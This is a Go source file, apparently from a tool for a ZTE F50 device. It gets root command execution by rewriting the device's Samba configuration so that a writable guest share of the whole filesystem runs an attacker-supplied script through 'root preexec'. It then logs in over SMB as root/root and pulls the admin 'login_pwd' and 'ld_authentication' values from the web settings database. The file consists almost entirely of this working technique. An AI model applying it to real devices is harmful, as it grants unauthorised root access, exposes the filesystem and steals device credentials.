package main

import (
	"database/sql"
	"io"
	"io/ioutil"
	"net"
	"os"
	"sync"
	"time"

	"github.com/hirochachacha/go-smb2"
	ini "gopkg.in/ini.v1"
)

func rootShell(rootSh string, toLog bool) error {
	initRuntime()
	// 将内容写入文件
	filePath := runtimePath("rootsh.sh")
	err := os.WriteFile(filePath, []byte(rootSh), 0777)
	if err != nil {
		print("写入rootSh文件失败:", err)
		return err
	}
	defer os.Remove(filePath)
	smbFile := "/data/samba/etc/smb.conf"
	cfg, err := ini.Load(smbFile)
	if err != nil {
		print("打开smb.conf失败", err)
		return err
	}

	// 添加或获取 [] 分节
	newSection := cfg.Section("F50-web-atwat")

	// 设置键值对（自动覆盖已存在的键）
	newSection.Key("comment").SetValue("Android Server")
	newSection.Key("path").SetValue("/")
	newSection.Key("browseable").SetValue("yes")
	newSection.Key("writable").SetValue("yes")
	newSection.Key("public").SetValue("yes")
	newSection.Key("guest ok").SetValue("yes")
	if toLog {
		filePath2 := runtimePath("rootsh2.sh")
		tmpLogPath := runtimePath("rootshtmp.log")
		logPath := runtimePath("rootsh.log")
		err := os.WriteFile(filePath2, []byte(shellPath()+" "+shellQuote(filePath)+" > "+shellQuote(tmpLogPath)+" 2>&1; mv "+shellQuote(tmpLogPath)+" "+shellQuote(logPath)), 0777)
		if err != nil {
			print("写入rootSh文件失败:", err)
			return err
		}
		defer os.Remove(filePath2)
		newSection.Key("root preexec").SetValue(shellPath() + " " + filePath2 + " &")
	} else {
		newSection.Key("root preexec").SetValue(shellPath() + " " + filePath + " &")
	}

	//保存配置文件
	err = cfg.SaveToIndent(smbFile, "        ")
	if err != nil {
		printf("修改smb.conf失败: %v", err)
		return err
	}
	err = smb()
	if err != nil {
		return err
	}
	cfg.DeleteSection("F50-web-atwat")
	//恢复配置文件
	cfg.SaveToIndent(smbFile, "        ")
	return nil
}
func smb() error {
	// 定义 SMB 服务器和共享目录
	smbServer := HOST
	smbPort := "445"
	smbShare := "F50-web-atwat"
	smbUser := "root"
	smbPassword := "root"

	// 定义数据库文件路径
	remoteDBPath := "data/data/com.zte.web/databases/web_settings.db"
	localDBPath := runtimePath("web_settings.db")

	// 建立 TCP 连接
	conn, err := net.Dial("tcp", smbServer+":"+smbPort)
	if err != nil {
		printf("连接 SMB 失败: %v", err)
		return err
	}
	defer conn.Close()

	// 初始化 SMB 会话
	dialer := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     smbUser,
			Password: smbPassword,
		},
	}
	session, err := dialer.Dial(conn)
	if err != nil {
		printf("SMB 会话初始化失败: %v", err)
		return err
	}
	defer session.Logoff()

	// 挂载共享目录
	share, err := session.Mount(smbShare)
	if err != nil {
		printf("挂载共享目录失败: %v", err)
		return err
	}
	defer share.Umount()

	// 打开远程数据库文件
	remoteFile, err := share.Open(remoteDBPath)
	if err != nil {
		printf("打开远程数据库文件失败: %v", err)
		return err
	}
	defer remoteFile.Close()

	// 创建本地数据库文件
	localFile, err := os.Create(localDBPath)
	if err != nil {
		printf("创建本地数据库文件失败: %v", err)
		return err
	}
	defer localFile.Close()

	// 将远程文件内容复制到本地文件
	_, err = io.Copy(localFile, remoteFile)
	if err != nil {
		printf("复制文件失败: %v", err)
		return err
	}

	// 打开本地 SQLite 数据库
	db, err := sql.Open("sqlite3", localDBPath)
	if err != nil {
		printf("打开本地 SQLite 数据库失败: %v", err)
		return err
	}
	defer db.Close()

	// 查询数据库
	db.QueryRow("SELECT value FROM setting WHERE key = 'login_pwd'").Scan(&loginPwd)
	db.QueryRow("SELECT value FROM setting WHERE key = 'ld_authentication'").Scan(&ZTELD)
	// 删除本地数据库文件
	os.Remove(localDBPath)
	return nil
}

var rootShellLock sync.Mutex

func rootShellLog(rootSh string) (Log string, err error) {
	rootShellLock.Lock()
	defer rootShellLock.Unlock()
	err = rootShell(rootSh, true)
	if err != nil {
		return
	}
	logpath := runtimePath("rootsh.log")
	for {
		if _, err = os.Stat(logpath); os.IsNotExist(err) {
			time.Sleep(time.Second / 20)
			continue
		}
		break
	}
	// 读取文件内容
	var data []byte
	data, err = ioutil.ReadFile(logpath)
	if err != nil {
		print("读取文件时出错:", err)
		return
	}
	Log = string(data)

	// 删除文件
	os.Remove(logpath)
	return
}
